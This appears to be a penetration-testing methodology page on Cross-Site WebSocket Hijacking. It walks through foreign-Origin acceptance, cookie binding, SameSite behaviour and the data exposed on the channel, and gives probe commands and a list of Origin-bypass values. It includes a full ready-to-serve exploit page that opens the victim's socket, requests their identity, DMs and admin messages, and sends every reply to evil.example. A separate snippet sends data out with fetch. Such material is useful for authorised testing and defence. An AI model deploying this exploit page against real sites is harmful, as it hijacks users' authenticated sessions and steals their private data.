# CSWSH (deep) — the four-condition chain, each worked

## Condition 1: foreign `Origin` accepted

```bash
python3 tools/web/ws_probe.py "$WS/ws" --origin 'https://evil.example' --message '{}'
# -> 101 = accepted ; -> 403/close = checked
```

The bypass set when `403`: `null`, `file://`, `https://target.evil.com`,
`https://eviltarget.com`, `https://target.com.evil.com`,
`https://sub.target.com`, `https://target.com.attacker.com`, no `Origin`.

## Condition 2: cookie-binding

```bash
python3 tools/web/ws_probe.py "$WS/ws" --headers 'Cookie: session=victim' --message '{"action":"me"}'
# -> a reply carrying the victim identity = the cookie bound the socket
```

The binding is to the COOKIE — not a `?token=`/`Authorization` the
attacker page lacks. If the socket auths by a URL-token, the attacker
page opens the socket but cannot authenticate it → CSWSH dies here.

## Condition 3: the cookie travels — the SameSite matrix

| `SameSite` | The cookie on a cross-site WS open |
|---|---|
| `Strict` | does NOT travel → CSWSH fails |
| `Lax` (default) | travels on a TOP-LEVEL navigation; a sub-resource `new WebSocket` is browser-dependent — TEST it |
| `None` | travels → CSWSH |
| none set | `Lax` default |
| `partitioned`/CHIPS | a partitioned third-party cookie — partitioned away |

```bash
curl -sI "$BASE/login" | grep -i 'set-cookie'
# Set-Cookie: session=x; SameSite=Lax   <- read this BEFORE claiming CSWSH
```

The SameSite rule is a BROWSER defense, not a server defense — the
server still accepts the foreign `Origin`; the browser just does not
send the cookie. A `SameSite=None` or a `Lax`+top-level-context makes
it exploitable.

## Condition 4: data/action on the channel

The socket must carry victim data or accept a privileged action —
```javascript
ws.onopen = () => ws.send('{"action":"me"}');   // the victim's identity
ws.onopen = () => ws.send('{"action":"history"}'); // the victim's data
ws.onmessage = e => fetch('https://evil/?d='+btoa(e.data)); // exfil
```

A `101`+empty/`pong` is not exploitable — the channel must produce a
reply carrying victim data or accept a privileged action.

## The full CSWSH exploit page

```html
<!doctype html><script>
var ws = new WebSocket("wss://TARGET/ws");           // foreign Origin
ws.onopen = () => {
  ws.send('{"action":"me"}');                         // the victim's id
  ws.send('{"action":"history","room":"dm"}');        // the victim's DMs
  ws.send('{"action":"read","id":"admin"}');          // a message-IDOR too
};
ws.onmessage = e => {                                  // the bidirectional read
  new Image().src = "https://evil.example/?d=" + encodeURIComponent(btoa(e.data));
};
</script>
```

Serve it on your origin; the victim's browser opens the socket AS them
and your page reads/writes the channel.

## The CSWSH-vs-the-baseline read

- a foreign-`Origin`+no-cookie `101` that returns PUBLIC data → the
  Origin gap only — weak
- a foreign-`Origin`+cookie `101` that returns the VICTIM's data → CSWSH
- a foreign-`Origin`+cookie `101` that returns your OWN (attacker's)
  session → the cookie bound to YOUR session, not the victim's — a
  self-CSWSH, not exploitable on a victim

## The record

```
cswsh: origin=https://evil accepted (101 verbatim)
       binding=Cookie:session (the victim identity bound)
       cookie=SameSite=Lax (travels)
       read={"action":"me" -> victim data} OR action={...}
verdict: CSWSH — the socket reads/writes as the victim
```
